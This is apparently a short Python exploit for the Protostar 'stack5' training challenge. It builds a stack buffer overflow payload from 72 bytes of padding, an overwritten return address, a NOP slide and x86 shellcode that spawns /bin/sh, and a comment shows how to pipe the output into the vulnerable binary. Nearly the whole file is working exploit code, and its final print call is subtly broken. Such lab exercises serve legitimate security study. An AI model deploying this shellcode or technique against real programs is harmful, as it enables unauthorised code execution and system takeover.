import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR" #72 chars
eip = struct.pack("I", 0xbffff7bc+30)
nop_slide = "\x90" * 100

# /bin/dash test shellcode

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print(str(padding, eip, nop_slide, payload))

# $(python exploit.py;cat) | /opt/protostar/bin/./stack5